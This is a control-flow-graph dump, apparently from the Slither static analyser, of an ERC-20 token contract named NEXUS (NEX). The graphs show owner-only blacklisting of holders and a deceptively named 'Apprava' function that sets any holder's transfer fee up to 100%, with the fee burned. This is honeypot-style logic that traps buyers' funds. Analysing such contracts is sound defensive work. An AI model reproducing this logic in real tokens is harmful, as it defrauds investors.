Contract: IERC20
==================================================


Contract: Context
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: address(msg.sender)

Edges:
  0 -> 1


Contract: Ownable
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: address(msg.sender)

Edges:
  0 -> 1

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: msgSender = _msgSender()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = msgSender

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(address(0),msgSender)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1


Contract: NEX
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _balances[_msgSender()] = _totalSupply

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),_msgSender(),_totalSupply)

Edges:
  0 -> 1
  1 -> 2

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: address(msg.sender)

Edges:
  0 -> 1

Function: symbol
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _symbol

Edges:
  0 -> 1

Function: decimals
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _decimals

Edges:
  0 -> 1

Function: name
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _name

Edges:
  0 -> 1

Function: blockBot
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _isBot[botAddress],Address is already blocked)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _isBot[botAddress] = true

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: BotBlocked(botAddress)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: unblockBot
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_isBot[botAddress],Address is not blocked)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _isBot[botAddress] = false

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: BotUnblocked(botAddress)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: isBot
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _isBot[account]

Edges:
  0 -> 1

Function: Apprava
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: maxFee = 100

  ID: 2
  Type: NodeType.VARIABLE
  Expression: condition = feePercents <= maxFee

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _conditionReverter(condition)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _setTransferFee(user,feePercents)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 5
  1 -> 2
  2 -> 3
  3 -> 4
  5 -> 1

Function: _conditionReverter
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(condition,Invalid fee percent)

Edges:
  0 -> 1

Function: _setTransferFee
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transferFees[user] = fee

Edges:
  0 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _balances[account]

Edges:
  0 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _isBot[_msgSender()] && ! _isBot[recipient],Bot address detected)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_balances[_msgSender()] >= amount,TT: transfer amount exceeds balance)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: fee = amount * _transferFees[_msgSender()] / 100

  ID: 4
  Type: NodeType.VARIABLE
  Expression: finalAmount = amount - fee

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _balances[_msgSender()] -= amount

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _balances[recipient] += finalAmount

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: _balances[BLACK_HOLE] += fee

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: Transfer(_msgSender(),recipient,finalAmount)

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: Transfer(_msgSender(),BLACK_HOLE,fee)

  ID: 10
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _allowances[owner][spender]

Edges:
  0 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _isBot[_msgSender()] && ! _isBot[spender],Bot address detected)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _allowances[_msgSender()][spender] = amount

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: Approval(_msgSender(),spender,amount)

  ID: 4
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _isBot[sender] && ! _isBot[recipient] && ! _isBot[_msgSender()],Bot address detected)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_allowances[sender][_msgSender()] >= amount,TT: transfer amount exceeds allowance)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: fee = amount * _transferFees[sender] / 100

  ID: 4
  Type: NodeType.VARIABLE
  Expression: finalAmount = amount - fee

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _balances[sender] -= amount

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _balances[recipient] += finalAmount

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: _allowances[sender][_msgSender()] -= amount

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: _balances[BLACK_HOLE] += fee

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: Transfer(sender,recipient,finalAmount)

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: Transfer(sender,BLACK_HOLE,fee)

  ID: 11
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11

Function: totalSupply
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _totalSupply

Edges:
  0 -> 1

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _decimals = 9

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _totalSupply = 100000000 * 10 ** _decimals

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _name = NEXUS

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _symbol = NEX

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: BLACK_HOLE = 0x000000000000000000000000000000000000dEaD

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4


